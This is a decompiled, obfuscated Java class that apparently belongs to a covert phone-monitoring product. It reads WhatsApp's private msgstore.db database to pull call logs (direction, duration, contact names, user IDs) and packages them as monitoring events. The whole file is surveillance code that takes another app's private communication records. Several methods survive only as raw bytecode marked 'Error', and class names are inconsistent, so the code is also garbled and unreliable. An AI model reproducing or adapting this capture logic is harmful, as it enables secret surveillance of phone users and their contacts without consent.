package com.vvt.capture.wa.voip.calllog;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import com.vvt.base.FxEvent;
import com.vvt.capture.wa.a.d;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxVoipCallLogEvent;
import com.vvt.events.FxVoipCallLogEvent.FxIsMonitor;
import com.vvt.events.FxVoipCategory;
import com.vvt.im.events.info.ICallLogData.Direction;
import com.vvt.im.events.info.ICallLogData.IsMonitor;
import java.util.ArrayList;

public class b
{
  public static final boolean a;
  public static final boolean b;
  public static final boolean c;
  
  static
  {
    boolean bool = com.vvt.ak.a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      b = com.vvt.ak.a.b;
      c = com.vvt.ak.a.e;
      return;
    }
  }
  
  public static long a()
  {
    long l = -1;
    localSQLiteDatabase = null;
    String str1 = "com.whatsapp";
    String str2 = "msgstore.db";
    try
    {
      localSQLiteDatabase = com.vvt.capture.wa.b.b.a(str1, str2);
      l = a(localSQLiteDatabase);
      if (localSQLiteDatabase == null) {
        break label32;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool = c;
        if ((bool) && (localSQLiteDatabase == null)) {}
      }
    }
    finally
    {
      if (localSQLiteDatabase == null) {
        break label62;
      }
      localSQLiteDatabase.close();
    }
    localSQLiteDatabase.close();
    label32:
    return l;
  }
  
  /* Error */
  private static long a(SQLiteDatabase paramSQLiteDatabase)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: iconst_m1
    //   3: i2l
    //   4: lstore_2
    //   5: ldc 44
    //   7: astore 4
    //   9: iconst_2
    //   10: istore 5
    //   12: iload 5
    //   14: anewarray 4	java/lang/Object
    //   17: astore 6
    //   19: iconst_0
    //   20: istore 7
    //   22: aconst_null
    //   23: astore 8
    //   25: ldc 47
    //   27: astore 9
    //   29: aload 6
    //   31: iconst_0
    //   32: aload 9
    //   34: aastore
    //   35: iconst_1
    //   36: istore 7
    //   38: ldc 47
    //   40: astore 9
    //   42: aload 6
    //   44: iload 7
    //   46: aload 9
    //   48: aastore
    //   49: aload 4
    //   51: aload 6
    //   53: invokestatic 53	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   56: astore 9
    //   58: iconst_1
    //   59: istore 10
    //   61: iload 10
    //   63: anewarray 49	java/lang/String
    //   66: astore 11
    //   68: iconst_0
    //   69: istore 10
    //   71: aconst_null
    //   72: astore 4
    //   74: ldc 55
    //   76: astore 6
    //   78: aload 11
    //   80: iconst_0
    //   81: aload 6
    //   83: aastore
    //   84: ldc 57
    //   86: astore 4
    //   88: iconst_1
    //   89: istore 5
    //   91: iload 5
    //   93: anewarray 4	java/lang/Object
    //   96: astore 6
    //   98: iconst_0
    //   99: istore 7
    //   101: aconst_null
    //   102: astore 8
    //   104: ldc 59
    //   106: astore 12
    //   108: aload 6
    //   110: iconst_0
    //   111: aload 12
    //   113: aastore
    //   114: aload 4
    //   116: aload 6
    //   118: invokestatic 53	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   121: astore 13
    //   123: ldc 61
    //   125: astore 6
    //   127: iconst_0
    //   128: istore 7
    //   130: aconst_null
    //   131: astore 8
    //   133: aconst_null
    //   134: astore 12
    //   136: ldc 63
    //   138: astore 14
    //   140: aload_0
    //   141: astore 4
    //   143: aload_0
    //   144: aload 6
    //   146: aconst_null
    //   147: aload 9
    //   149: aload 11
    //   151: aconst_null
    //   152: aconst_null
    //   153: aload 13
    //   155: aload 14
    //   157: invokevirtual 67	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   160: astore 8
    //   162: aload 8
    //   164: ifnull +139 -> 303
    //   167: aload 8
    //   169: invokeinterface 73 1 0
    //   174: istore 10
    //   176: iload 10
    //   178: ifeq +54 -> 232
    //   181: ldc 59
    //   183: astore 4
    //   185: aload 8
    //   187: aload 4
    //   189: invokeinterface 77 2 0
    //   194: istore 10
    //   196: aload 8
    //   198: iload 10
    //   200: invokeinterface 81 2 0
    //   205: lstore 15
    //   207: getstatic 14	com/vvt/capture/wa/voip/calllog/removeFromPath:a	Z
    //   210: istore 17
    //   212: iload 17
    //   214: ifeq +3 -> 217
    //   217: aload 8
    //   219: ifnull +10 -> 229
    //   222: aload 8
    //   224: invokeinterface 82 1 0
    //   229: lload 15
    //   231: lreturn
    //   232: lconst_0
    //   233: lstore 15
    //   235: goto -28 -> 207
    //   238: astore 4
    //   240: iconst_0
    //   241: istore 7
    //   243: aconst_null
    //   244: astore 8
    //   246: lload_2
    //   247: lstore 15
    //   249: getstatic 22	com/vvt/capture/wa/voip/calllog/removeFromPath:MyUncaughtExceptionHandler	Z
    //   252: istore 17
    //   254: iload 17
    //   256: ifeq +3 -> 259
    //   259: aload 8
    //   261: ifnull -32 -> 229
    //   264: goto -42 -> 222
    //   267: astore 4
    //   269: aload_1
    //   270: ifnull +9 -> 279
    //   273: aload_1
    //   274: invokeinterface 82 1 0
    //   279: aload 4
    //   281: athrow
    //   282: astore 4
    //   284: aload 8
    //   286: astore_1
    //   287: goto -18 -> 269
    //   290: astore 4
    //   292: lload_2
    //   293: lstore 15
    //   295: goto -46 -> 249
    //   298: astore 9
    //   300: goto -51 -> 249
    //   303: lload_2
    //   304: lstore 15
    //   306: goto -99 -> 207
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	309	0	paramSQLiteDatabase	SQLiteDatabase
    //   1	286	1	localObject1	Object
    //   4	300	2	l1	long
    //   7	181	4	localObject2	Object
    //   238	1	4	localException1	Exception
    //   267	13	4	localObject3	Object
    //   282	1	4	localObject4	Object
    //   290	1	4	localException2	Exception
    //   10	82	5	i	int
    //   17	128	6	localObject5	Object
    //   20	222	7	j	int
    //   23	262	8	localCursor	Cursor
    //   27	121	9	str1	String
    //   298	1	9	localException3	Exception
    //   59	118	10	bool1	boolean
    //   194	5	10	k	int
    //   66	84	11	arrayOfString	String[]
    //   106	29	12	str2	String
    //   121	33	13	str3	String
    //   138	18	14	str4	String
    //   205	100	15	l2	long
    //   210	45	17	bool2	boolean
    // Exception table:
    //   from	to	target	type
    //   12	17	238	java/lang/Exception
    //   32	35	238	java/lang/Exception
    //   46	49	238	java/lang/Exception
    //   51	56	238	java/lang/Exception
    //   61	66	238	java/lang/Exception
    //   81	84	238	java/lang/Exception
    //   91	96	238	java/lang/Exception
    //   111	114	238	java/lang/Exception
    //   116	121	238	java/lang/Exception
    //   155	160	238	java/lang/Exception
    //   12	17	267	finally
    //   32	35	267	finally
    //   46	49	267	finally
    //   51	56	267	finally
    //   61	66	267	finally
    //   81	84	267	finally
    //   91	96	267	finally
    //   111	114	267	finally
    //   116	121	267	finally
    //   155	160	267	finally
    //   167	174	282	finally
    //   187	194	282	finally
    //   198	205	282	finally
    //   207	210	282	finally
    //   249	252	282	finally
    //   167	174	290	java/lang/Exception
    //   187	194	290	java/lang/Exception
    //   198	205	290	java/lang/Exception
    //   207	210	298	java/lang/Exception
  }
  
  public static long a(String paramString)
  {
    localSQLiteDatabase = null;
    long l = -1;
    try
    {
      localSQLiteDatabase = com.vvt.capture.wa.b.b.a(paramString);
      l = a(localSQLiteDatabase);
      if (localSQLiteDatabase == null) {
        break label23;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        label23:
        boolean bool = c;
        if ((bool) && (localSQLiteDatabase == null)) {}
      }
    }
    finally
    {
      if (localSQLiteDatabase == null) {
        break label53;
      }
      localSQLiteDatabase.close();
    }
    localSQLiteDatabase.close();
    return l;
  }
  
  public static FxEvent a(com.vvt.capture.wa.a.a parama)
  {
    FxVoipCallLogEvent localFxVoipCallLogEvent = new com/vvt/events/FxVoipCallLogEvent;
    localFxVoipCallLogEvent.<init>();
    long l = parama.h();
    localFxVoipCallLogEvent.setEventTime(l);
    Object localObject1 = FxVoipCategory.WHATSAPP;
    localFxVoipCallLogEvent.setVoipCategory((FxVoipCategory)localObject1);
    localObject1 = FxEventDirection.MISSED_CALL;
    Object localObject2 = parama.i();
    ICallLogData.Direction localDirection = ICallLogData.Direction.IN;
    if (localObject2 == localDirection)
    {
      localObject1 = FxEventDirection.IN;
      localFxVoipCallLogEvent.setDirection((FxEventDirection)localObject1);
      l = parama.a();
      localFxVoipCallLogEvent.setDuration(l);
      localObject1 = parama.b();
      localFxVoipCallLogEvent.setUserId((String)localObject1);
      localObject1 = parama.c();
      localFxVoipCallLogEvent.setContactName((String)localObject1);
      int i = parama.d();
      l = i;
      localFxVoipCallLogEvent.setTransferredBytes(l);
      localObject1 = parama.e();
      localObject2 = ICallLogData.IsMonitor.YES;
      if (localObject1 != localObject2) {
        break label180;
      }
    }
    label180:
    for (localObject1 = FxVoipCallLogEvent.FxIsMonitor.YES;; localObject1 = FxVoipCallLogEvent.FxIsMonitor.NO)
    {
      localFxVoipCallLogEvent.setIsMonitor((FxVoipCallLogEvent.FxIsMonitor)localObject1);
      l = parama.f();
      localFxVoipCallLogEvent.setFrameStripId(l);
      return localFxVoipCallLogEvent;
      localObject2 = parama.i();
      localDirection = ICallLogData.Direction.OUT;
      if (localObject2 != localDirection) {
        break;
      }
      localObject1 = FxEventDirection.OUT;
      break;
    }
  }
  
  private static d a(SQLiteDatabase paramSQLiteDatabase, String paramString, boolean paramBoolean)
  {
    boolean bool = a;
    if (bool) {}
    return b(paramSQLiteDatabase, paramString, paramBoolean);
  }
  
  public static ICallLogData.Direction a(int paramInt, long paramLong)
  {
    ICallLogData.Direction localDirection = ICallLogData.Direction.MISSED_CALL;
    switch (paramInt)
    {
    }
    for (;;)
    {
      return localDirection;
      long l = 0L;
      boolean bool = paramLong < l;
      if (bool)
      {
        localDirection = ICallLogData.Direction.IN;
        continue;
        localDirection = ICallLogData.Direction.OUT;
      }
    }
  }
  
  public static ArrayList a(long paramLong1, long paramLong2, boolean paramBoolean)
  {
    return a(paramLong1, paramLong2, paramBoolean, null);
  }
  
  /* Error */
  public static ArrayList a(long paramLong1, long paramLong2, boolean paramBoolean, String paramString)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore 6
    //   3: aconst_null
    //   4: astore 7
    //   6: getstatic 14	com/vvt/capture/wa/voip/calllog/removeFromPath:a	Z
    //   9: istore 8
    //   11: iload 8
    //   13: ifeq +3 -> 16
    //   16: new 198	java/util/ArrayList
    //   19: astore 9
    //   21: aload 9
    //   23: invokespecial 199	java/util/ArrayList:<init>	()V
    //   26: ldc 24
    //   28: astore 10
    //   30: ldc 26
    //   32: astore 11
    //   34: aload 10
    //   36: aload 11
    //   38: invokestatic 31	com/vvt/capture/wa/removeFromPath/removeFromPath:a	(Ljava/lang/String;Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   41: astore 10
    //   43: ldc 24
    //   45: astore 11
    //   47: ldc -55
    //   49: astore 12
    //   51: aload 11
    //   53: aload 12
    //   55: invokestatic 31	com/vvt/capture/wa/removeFromPath/removeFromPath:a	(Ljava/lang/String;Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   58: astore 7
    //   60: aload 10
    //   62: aload 7
    //   64: lload_0
    //   65: lload_2
    //   66: iload 4
    //   68: aload 5
    //   70: invokestatic 204	com/vvt/capture/wa/voip/calllog/removeFromPath:a	(Landroid/database/sqlite/SQLiteDatabase;Landroid/database/sqlite/SQLiteDatabase;JJZLjava/lang/String;)Ljava/util/ArrayList;
    //   73: astore 11
    //   75: aload 10
    //   77: ifnull +8 -> 85
    //   80: aload 10
    //   82: invokevirtual 40	android/database/sqlite/SQLiteDatabase:close	()V
    //   85: aload 7
    //   87: ifnull +8 -> 95
    //   90: aload 7
    //   92: invokevirtual 40	android/database/sqlite/SQLiteDatabase:close	()V
    //   95: aload 11
    //   97: astore 10
    //   99: getstatic 14	com/vvt/capture/wa/voip/calllog/removeFromPath:a	Z
    //   102: istore 6
    //   104: iload 6
    //   106: ifeq +3 -> 109
    //   109: aload 10
    //   111: areturn
    //   112: astore 10
    //   114: iconst_0
    //   115: istore 8
    //   117: aconst_null
    //   118: astore 10
    //   120: getstatic 22	com/vvt/capture/wa/voip/calllog/removeFromPath:MyUncaughtExceptionHandler	Z
    //   123: istore 13
    //   125: iload 13
    //   127: ifeq +3 -> 130
    //   130: aload 10
    //   132: ifnull +8 -> 140
    //   135: aload 10
    //   137: invokevirtual 40	android/database/sqlite/SQLiteDatabase:close	()V
    //   140: aload 7
    //   142: ifnull +8 -> 150
    //   145: aload 7
    //   147: invokevirtual 40	android/database/sqlite/SQLiteDatabase:close	()V
    //   150: aload 9
    //   152: astore 10
    //   154: goto -55 -> 99
    //   157: astore 10
    //   159: iconst_0
    //   160: istore 13
    //   162: aconst_null
    //   163: astore 11
    //   165: aload 11
    //   167: ifnull +8 -> 175
    //   170: aload 11
    //   172: invokevirtual 40	android/database/sqlite/SQLiteDatabase:close	()V
    //   175: aload 7
    //   177: ifnull +8 -> 185
    //   180: aload 7
    //   182: invokevirtual 40	android/database/sqlite/SQLiteDatabase:close	()V
    //   185: aload 10
    //   187: athrow
    //   188: astore 14
    //   190: aload 10
    //   192: astore 11
    //   194: aload 14
    //   196: astore 10
    //   198: goto -33 -> 165
    //   201: astore 11
    //   203: goto -83 -> 120
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	206	0	paramLong1	long
    //   0	206	2	paramLong2	long
    //   0	206	4	paramBoolean	boolean
    //   0	206	5	paramString	String
    //   1	104	6	bool1	boolean
    //   4	177	7	localSQLiteDatabase	SQLiteDatabase
    //   9	107	8	bool2	boolean
    //   19	132	9	localArrayList1	ArrayList
    //   28	82	10	localObject1	Object
    //   112	1	10	localException1	Exception
    //   118	35	10	localArrayList2	ArrayList
    //   157	34	10	localObject2	Object
    //   196	1	10	localObject3	Object
    //   32	161	11	localObject4	Object
    //   201	1	11	localException2	Exception
    //   49	5	12	str	String
    //   123	38	13	bool3	boolean
    //   188	7	14	localObject5	Object
    // Exception table:
    //   from	to	target	type
    //   36	41	112	java/lang/Exception
    //   36	41	157	finally
    //   53	58	188	finally
    //   68	73	188	finally
    //   120	123	188	finally
    //   53	58	201	java/lang/Exception
    //   68	73	201	java/lang/Exception
  }
  
  public static ArrayList a(long paramLong1, long paramLong2, boolean paramBoolean, String paramString1, String paramString2)
  {
    return a(paramLong1, paramLong2, paramBoolean, paramString1, paramString2, null);
  }
  
  public static ArrayList a(long paramLong1, long paramLong2, boolean paramBoolean, String paramString1, String paramString2, String paramString3)
  {
    ArrayList localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    localObject1 = null;
    boolean bool1 = false;
    SQLiteDatabase localSQLiteDatabase = null;
    try
    {
      localObject1 = com.vvt.capture.wa.b.b.a(paramString1);
      ArrayList localArrayList2;
      boolean bool2;
      if (localObject2 == null) {
        break label146;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        try
        {
          localSQLiteDatabase = com.vvt.capture.wa.b.b.a(paramString2);
          localArrayList2 = a((SQLiteDatabase)localObject1, localSQLiteDatabase, paramLong1, paramLong2, paramBoolean, paramString3);
          if (localObject1 != null) {
            ((SQLiteDatabase)localObject1).close();
          }
          if (localSQLiteDatabase != null) {
            localSQLiteDatabase.close();
          }
          localObject1 = localArrayList2;
          bool1 = a;
          if (bool1) {}
          return (ArrayList)localObject1;
        }
        finally
        {
          Object localObject2 = localObject1;
          localObject1 = localObject4;
          continue;
        }
        localException = localException;
        bool2 = c;
        if ((!bool2) || (localObject1 != null)) {
          ((SQLiteDatabase)localObject1).close();
        }
        if (localSQLiteDatabase != null) {
          localSQLiteDatabase.close();
        }
        localObject1 = localArrayList1;
      }
    }
    finally
    {
      localObject3 = finally;
      bool2 = false;
      localObject2 = null;
      localObject1 = localObject3;
    }
    ((SQLiteDatabase)localObject2).close();
    label146:
    if (localSQLiteDatabase != null) {
      localSQLiteDatabase.close();
    }
    throw ((Throwable)localObject1);
  }
  
  public static ArrayList a(SQLiteDatabase paramSQLiteDatabase, Cursor paramCursor, boolean paramBoolean)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = paramCursor.moveToLast();
    boolean bool2;
    if (bool1)
    {
      do
      {
        int i = paramCursor.getColumnIndex("key_from_me");
        i = paramCursor.getInt(i);
        int j = paramCursor.getColumnIndex("received_timestamp");
        long l1 = paramCursor.getLong(j);
        j = paramCursor.getColumnIndex("key_remote_jid");
        String str1 = paramCursor.getString(j);
        String str2 = "media_duration";
        int k = paramCursor.getColumnIndex(str2);
        k = paramCursor.getInt(k);
        long l2 = k;
        d locald = a(paramSQLiteDatabase, str1, paramBoolean);
        com.vvt.capture.wa.a.a locala = new com/vvt/capture/wa/a/a;
        locala.<init>();
        locala.b(l1);
        Object localObject = a(i, l2);
        locala.a((ICallLogData.Direction)localObject);
        locala.a(l2);
        localObject = locald.b();
        boolean bool3 = com.vvt.ag.b.a((String)localObject);
        if ((bool3) && (str1 != null))
        {
          String str3 = "@";
          int m = str1.indexOf(str3);
          int n = -1;
          if (m != n) {
            localObject = str1.substring(0, m);
          }
        }
        str1 = locald.c();
        boolean bool4 = com.vvt.ag.b.a(str1);
        if (bool4) {
          str1 = locald.d();
        }
        locala.a((String)localObject);
        locala.b(str1);
        locala.a(0);
        localObject = ICallLogData.IsMonitor.NO;
        locala.a((ICallLogData.IsMonitor)localObject);
        locala.b(0);
        bool2 = b;
        if (bool2) {}
        localArrayList.add(locala);
        bool2 = paramCursor.moveToPrevious();
      } while (bool2);
      bool2 = a;
      if (!bool2) {}
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return localArrayList;
      bool2 = c;
      if (!bool2) {}
    }
  }
  
  /* Error */
  private static ArrayList a(SQLiteDatabase paramSQLiteDatabase1, SQLiteDatabase paramSQLiteDatabase2, long paramLong1, long paramLong2, boolean paramBoolean, String paramString)
  {
    // Byte code:
    //   0: getstatic 14	com/vvt/capture/wa/voip/calllog/removeFromPath:a	Z
    //   3: istore 8
    //   5: iload 8
    //   7: ifeq +3 -> 10
    //   10: new 198	java/util/ArrayList
    //   13: astore 9
    //   15: aload 9
    //   17: invokespecial 199	java/util/ArrayList:<init>	()V
    //   20: iconst_3
    //   21: anewarray 4	java/lang/Object
    //   24: astore 10
    //   26: aload 10
    //   28: iconst_0
    //   29: ldc 59
    //   31: aastore
    //   32: aload 10
    //   34: iconst_1
    //   35: ldc 59
    //   37: aastore
    //   38: aload 10
    //   40: iconst_2
    //   41: ldc_w 285
    //   44: aastore
    //   45: ldc_w 282
    //   48: aload 10
    //   50: invokestatic 53	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   53: astore 11
    //   55: iconst_2
    //   56: anewarray 49	java/lang/String
    //   59: astore 12
    //   61: lload_2
    //   62: invokestatic 291	java/lang/Long:toString	(J)Ljava/lang/String;
    //   65: astore 10
    //   67: aload 12
    //   69: iconst_0
    //   70: aload 10
    //   72: aastore
    //   73: iconst_1
    //   74: istore 8
    //   76: lload 4
    //   78: invokestatic 291	java/lang/Long:toString	(J)Ljava/lang/String;
    //   81: astore 10
    //   83: aload 12
    //   85: iload 8
    //   87: aload 10
    //   89: aastore
    //   90: iconst_1
    //   91: istore 13
    //   93: iload 13
    //   95: anewarray 4	java/lang/Object
    //   98: astore 10
    //   100: aload 10
    //   102: iconst_0
    //   103: ldc 59
    //   105: aastore
    //   106: ldc 57
    //   108: aload 10
    //   110: invokestatic 53	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   113: astore 14
    //   115: aconst_null
    //   116: astore 15
    //   118: ldc 61
    //   120: astore 10
    //   122: aload_0
    //   123: astore 16
    //   125: aload_0
    //   126: aload 10
    //   128: aconst_null
    //   129: aload 11
    //   131: aload 12
    //   133: aconst_null
    //   134: aconst_null
    //   135: aload 14
    //   137: aload 7
    //   139: invokevirtual 67	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   142: astore 10
    //   144: aload 10
    //   146: ifnull +123 -> 269
    //   149: aload_1
    //   150: aload 10
    //   152: iload 6
    //   154: invokestatic 294	com/vvt/capture/wa/voip/calllog/removeFromPath:a	(Landroid/database/sqlite/SQLiteDatabase;Landroid/database/Cursor;Z)Ljava/util/ArrayList;
    //   157: astore 16
    //   159: aload 10
    //   161: ifnull +10 -> 171
    //   164: aload 10
    //   166: invokeinterface 82 1 0
    //   171: getstatic 14	com/vvt/capture/wa/voip/calllog/removeFromPath:a	Z
    //   174: istore 13
    //   176: iload 13
    //   178: ifeq +3 -> 181
    //   181: aload 16
    //   183: areturn
    //   184: astore 16
    //   186: iconst_0
    //   187: istore 8
    //   189: aconst_null
    //   190: astore 16
    //   192: getstatic 22	com/vvt/capture/wa/voip/calllog/removeFromPath:MyUncaughtExceptionHandler	Z
    //   195: istore 13
    //   197: iload 13
    //   199: ifeq +3 -> 202
    //   202: aload 16
    //   204: ifnull +10 -> 214
    //   207: aload 16
    //   209: invokeinterface 82 1 0
    //   214: aload 9
    //   216: astore 16
    //   218: goto -47 -> 171
    //   221: astore 16
    //   223: aload 15
    //   225: ifnull +10 -> 235
    //   228: aload 15
    //   230: invokeinterface 82 1 0
    //   235: aload 16
    //   237: athrow
    //   238: astore 16
    //   240: aload 10
    //   242: astore 15
    //   244: goto -21 -> 223
    //   247: astore 10
    //   249: aload 16
    //   251: astore 15
    //   253: aload 10
    //   255: astore 16
    //   257: goto -34 -> 223
    //   260: astore 16
    //   262: aload 10
    //   264: astore 16
    //   266: goto -74 -> 192
    //   269: aload 9
    //   271: astore 16
    //   273: goto -114 -> 159
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	276	0	paramSQLiteDatabase1	SQLiteDatabase
    //   0	276	1	paramSQLiteDatabase2	SQLiteDatabase
    //   0	276	2	paramLong1	long
    //   0	276	4	paramLong2	long
    //   0	276	6	paramBoolean	boolean
    //   0	276	7	paramString	String
    //   3	185	8	bool1	boolean
    //   13	257	9	localArrayList1	ArrayList
    //   24	217	10	localObject1	Object
    //   247	16	10	localObject2	Object
    //   53	77	11	str1	String
    //   59	73	12	arrayOfString	String[]
    //   91	107	13	bool2	boolean
    //   113	23	14	str2	String
    //   116	136	15	localObject3	Object
    //   123	59	16	localObject4	Object
    //   184	1	16	localException1	Exception
    //   190	27	16	localArrayList2	ArrayList
    //   221	15	16	localObject5	Object
    //   238	12	16	localObject6	Object
    //   255	1	16	localObject7	Object
    //   260	1	16	localException2	Exception
    //   264	8	16	localObject8	Object
    // Exception table:
    //   from	to	target	type
    //   137	142	184	java/lang/Exception
    //   137	142	221	finally
    //   152	157	238	finally
    //   192	195	247	finally
    //   152	157	260	java/lang/Exception
  }
  
  /* Error */
  private static d b(SQLiteDatabase paramSQLiteDatabase, String paramString, boolean paramBoolean)
  {
    // Byte code:
    //   0: iconst_1
    //   1: istore_3
    //   2: aconst_null
    //   3: astore 4
    //   5: getstatic 14	com/vvt/capture/wa/voip/calllog/removeFromPath:a	Z
    //   8: istore 5
    //   10: iload 5
    //   12: ifeq +3 -> 15
    //   15: new 241	com/vvt/capture/wa/a/d
    //   18: astore 6
    //   20: aload 6
    //   22: invokespecial 295	com/vvt/capture/wa/a/d:<init>	()V
    //   25: iload_3
    //   26: anewarray 4	java/lang/Object
    //   29: astore 7
    //   31: aload 7
    //   33: iconst_0
    //   34: ldc_w 299
    //   37: aastore
    //   38: ldc_w 297
    //   41: aload 7
    //   43: invokestatic 53	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   46: astore 8
    //   48: iload_3
    //   49: anewarray 49	java/lang/String
    //   52: astore 9
    //   54: new 301	java/lang/StringBuilder
    //   57: astore 10
    //   59: aload 10
    //   61: invokespecial 302	java/lang/StringBuilder:<init>	()V
    //   64: aload 10
    //   66: aload_1
    //   67: invokevirtual 306	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   70: ldc 55
    //   72: invokevirtual 306	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   75: invokevirtual 308	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   78: astore 10
    //   80: aload 9
    //   82: iconst_0
    //   83: aload 10
    //   85: aastore
    //   86: ldc 57
    //   88: astore 7
    //   90: iload_3
    //   91: anewarray 4	java/lang/Object
    //   94: astore 11
    //   96: iload_2
    //   97: ifeq +243 -> 340
    //   100: ldc_w 310
    //   103: astore 10
    //   105: aload 11
    //   107: iconst_0
    //   108: aload 10
    //   110: aastore
    //   111: aload 7
    //   113: aload 11
    //   115: invokestatic 53	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   118: astore 12
    //   120: ldc_w 312
    //   123: astore 7
    //   125: aconst_null
    //   126: astore 11
    //   128: iconst_0
    //   129: istore_3
    //   130: aload_0
    //   131: astore 10
    //   133: aload_0
    //   134: aload 7
    //   136: aconst_null
    //   137: aload 8
    //   139: aload 9
    //   141: aconst_null
    //   142: aconst_null
    //   143: aload 12
    //   145: invokevirtual 315	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   148: astore 10
    //   150: aload 10
    //   152: ifnull +153 -> 305
    //   155: aload 10
    //   157: invokeinterface 210 1 0
    //   162: istore 13
    //   164: iload 13
    //   166: ifeq +139 -> 305
    //   169: ldc_w 317
    //   172: astore 7
    //   174: aload 10
    //   176: aload 7
    //   178: invokeinterface 77 2 0
    //   183: istore 13
    //   185: aload 10
    //   187: iload 13
    //   189: invokeinterface 224 2 0
    //   194: astore 7
    //   196: aload 6
    //   198: aload 7
    //   200: invokevirtual 318	com/vvt/capture/wa/a/d:a	(Ljava/lang/String;)V
    //   203: ldc_w 320
    //   206: astore 7
    //   208: aload 10
    //   210: aload 7
    //   212: invokeinterface 77 2 0
    //   217: istore 13
    //   219: aload 10
    //   221: iload 13
    //   223: invokeinterface 224 2 0
    //   228: astore 7
    //   230: aload 6
    //   232: aload 7
    //   234: invokevirtual 322	com/vvt/capture/wa/a/d:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
    //   237: ldc_w 324
    //   240: astore 7
    //   242: aload 10
    //   244: aload 7
    //   246: invokeinterface 77 2 0
    //   251: istore 13
    //   253: aload 10
    //   255: iload 13
    //   257: invokeinterface 224 2 0
    //   262: astore 7
    //   264: aload 6
    //   266: aload 7
    //   268: invokevirtual 325	com/vvt/capture/wa/a/d:removeFromPath	(Ljava/lang/String;)V
    //   271: ldc_w 327
    //   274: astore 7
    //   276: aload 10
    //   278: aload 7
    //   280: invokeinterface 77 2 0
    //   285: istore 13
    //   287: aload 10
    //   289: iload 13
    //   291: invokeinterface 224 2 0
    //   296: astore 7
    //   298: aload 6
    //   300: aload 7
    //   302: invokevirtual 329	com/vvt/capture/wa/a/d:d	(Ljava/lang/String;)V
    //   305: aload 10
    //   307: ifnull +10 -> 317
    //   310: aload 10
    //   312: invokeinterface 82 1 0
    //   317: getstatic 14	com/vvt/capture/wa/voip/calllog/removeFromPath:a	Z
    //   320: istore 5
    //   322: iload 5
    //   324: ifeq +3 -> 327
    //   327: getstatic 14	com/vvt/capture/wa/voip/calllog/removeFromPath:a	Z
    //   330: istore 5
    //   332: iload 5
    //   334: ifeq +3 -> 337
    //   337: aload 6
    //   339: areturn
    //   340: ldc 59
    //   342: astore 10
    //   344: goto -239 -> 105
    //   347: astore 10
    //   349: iconst_0
    //   350: istore 5
    //   352: aconst_null
    //   353: astore 10
    //   355: getstatic 22	com/vvt/capture/wa/voip/calllog/removeFromPath:MyUncaughtExceptionHandler	Z
    //   358: istore 13
    //   360: iload 13
    //   362: ifeq +3 -> 365
    //   365: aload 10
    //   367: ifnull -50 -> 317
    //   370: goto -60 -> 310
    //   373: astore 10
    //   375: aload 4
    //   377: ifnull +10 -> 387
    //   380: aload 4
    //   382: invokeinterface 82 1 0
    //   387: aload 10
    //   389: athrow
    //   390: astore 7
    //   392: aload 10
    //   394: astore 4
    //   396: aload 7
    //   398: astore 10
    //   400: goto -25 -> 375
    //   403: astore 7
    //   405: goto -50 -> 355
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	408	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	408	1	paramString	String
    //   0	408	2	paramBoolean	boolean
    //   1	129	3	i	int
    //   3	392	4	localObject1	Object
    //   8	343	5	bool1	boolean
    //   18	320	6	locald	d
    //   29	272	7	localObject2	Object
    //   390	7	7	localObject3	Object
    //   403	1	7	localException1	Exception
    //   46	92	8	str1	String
    //   52	88	9	arrayOfString	String[]
    //   57	286	10	localObject4	Object
    //   347	1	10	localException2	Exception
    //   353	13	10	localObject5	Object
    //   373	20	10	localObject6	Object
    //   398	1	10	localObject7	Object
    //   94	33	11	arrayOfObject	Object[]
    //   118	26	12	str2	String
    //   162	3	13	bool2	boolean
    //   183	107	13	j	int
    //   358	3	13	bool3	boolean
    // Exception table:
    //   from	to	target	type
    //   143	148	347	java/lang/Exception
    //   143	148	373	finally
    //   155	162	390	finally
    //   176	183	390	finally
    //   187	194	390	finally
    //   198	203	390	finally
    //   210	217	390	finally
    //   221	228	390	finally
    //   232	237	390	finally
    //   244	251	390	finally
    //   255	262	390	finally
